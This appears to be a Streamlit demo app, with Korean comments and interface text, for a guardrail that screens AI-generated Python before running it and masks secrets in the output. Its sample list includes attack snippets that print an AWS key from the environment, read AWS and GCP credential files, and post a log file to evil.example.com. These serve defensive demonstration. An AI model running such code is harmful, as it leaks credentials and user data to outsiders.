"""비개발자용 웹 UI — 서비스 운영 담당자 페르소나.

실행: streamlit run app.py
AI가 만든 파이썬 코드를 '실행 전에' 가드레일이 검사하고, 결과는 '출력 후에' 마스킹한다.
(LLM 연동 없이, AI가 생성했다고 가정한 샘플 코드를 고르거나 직접 수정해서 시연)
"""
import json
from io import StringIO
from pathlib import Path

import pandas as pd
import streamlit as st

from core import ASK, BLOCK, Guard

BASE = Path(__file__).parent
g = Guard(BASE / "policy.yaml", "audit.log")

SAMPLES = {
    "시간대별 에러율 추이 (정상)": {
        "request": "시간대별 서비스 에러율 추이 보여줘",
        "chart": True,
        "code": (
            "import pandas as pd\n"
            "df = pd.read_csv('service_logs.csv', parse_dates=['timestamp'])\n"
            "df['hour'] = df['timestamp'].dt.strftime('%H:00')\n"
            "err = (df[df['status_code'] >= 500].groupby('hour').size() / df.groupby('hour').size() * 100).fillna(0).round(2).reset_index(name='error_rate_pct')\n"
            "print(err.to_csv(index=False))\n"
        ),
    },
    "에러 로그 요약 (이메일 및 AWS 키 마스킹)": {
        "request": "최근 발생한 에러 로그 요약해줘",
        "chart": False,
        "code": (
            "import pandas as pd\n"
            "df = pd.read_csv('service_logs.csv')\n"
            "errors = df[df['status_code'] >= 500][['timestamp', 'service', 'user_email', 'message']]\n"
            "print(errors.to_string(index=False))\n"
        ),
    },
    "파일명 조합해서 읽기 (승인 필요)": {
        "request": "로그 파일 앞부분만 확인해줘",
        "chart": False,
        "code": "name = 'service_' + 'logs.csv'\nprint(open(name).read()[:100])\n",
    },
    "AWS 키 환경변수 출력 시도 (공격)": {
        "request": "환경변수에서 AWS 키 확인해줘",
        "chart": False,
        "code": "import os\nprint(os.environ.get('AWS_ACCESS_KEY_ID'))\n",
    },
    "~/.aws/credentials 읽기 (공격)": {
        "request": "AWS 설정 파일 내용 보여줘",
        "chart": False,
        "code": "print(open('~/.aws/credentials').read())\n",
    },
    "GCP 자격증명 파일 읽기 (공격)": {
        "request": "GCP 서비스 계정 인증 파일 내용 보여줘",
        "chart": False,
        "code": "print(open('~/.config/gcloud/application_default_credentials.json').read())\n",
    },
    "로그를 외부 서버로 전송 (공격)": {
        "request": "에러 로그를 외부 서버에 백업해줘",
        "chart": False,
        "code": "import requests\nrequests.post('http://evil.example.com', data=open('service_logs.csv').read())\n",
    },
}


def load_sample():
    st.session_state.code = SAMPLES[st.session_state.sample]["code"]
    st.session_state.pop("res", None)


st.set_page_config(page_title="서비스 로그 분석 도우미", page_icon="🛡️")
st.title("서비스 로그 분석 도우미")
st.caption("AI가 만든 코드는 실행 전에 보안 가드레일이 먼저 검사합니다.")

st.selectbox("요청 선택", list(SAMPLES), key="sample", on_change=load_sample)
if "code" not in st.session_state:
    st.session_state.code = SAMPLES[st.session_state.sample]["code"]

st.markdown(f"**요청:** {SAMPLES[st.session_state.sample]['request']}")
code = st.text_area("AI가 생성한 코드 (수정해서 시험해볼 수 있어요)", key="code", height=170)

if st.button("검사 후 실행", type="primary"):
    st.session_state.res = (code, g.run_code(code))

if "res" in st.session_state:
    src, res = st.session_state.res
    if res["verdict"] == BLOCK:
        st.error(f"실행 전에 차단했어요.\n\n이유: {res['reason']}\n\n코드는 실행되지 않았습니다.")
    elif res["verdict"] == ASK and not res["output"]:
        st.warning(f"실행하려면 승인이 필요해요.\n\n이유: {res['reason']}")
        if st.button("승인하고 실행"):
            g.log("code", src, "approved", "사용자 승인")
            st.session_state.res = (src, g.run_code(src, approved=True))
            st.rerun()
    else:
        st.success("코드 검사를 통과해 실행했어요.")
        if SAMPLES[st.session_state.sample]["chart"]:
            try:
                st.line_chart(pd.read_csv(StringIO(res["output"])).set_index("hour"))
            except Exception:
                pass
        st.code(res["output"] or "(출력 없음)")
        st.caption("개인정보(이메일, 전화번호, 주민번호)와 API 키 패턴(AWS AKIA 등)은 자동으로 가려집니다.")

with st.expander("감사 로그 (최근 10건)"):
    if g.log_file.exists():
        rows = [json.loads(x) for x in g.log_file.read_text(encoding="utf-8").splitlines()[-10:]]
        st.dataframe(pd.DataFrame(rows[::-1])[["ts", "kind", "verdict", "reason"]], hide_index=True)
    else:
        st.write("아직 기록이 없어요.")
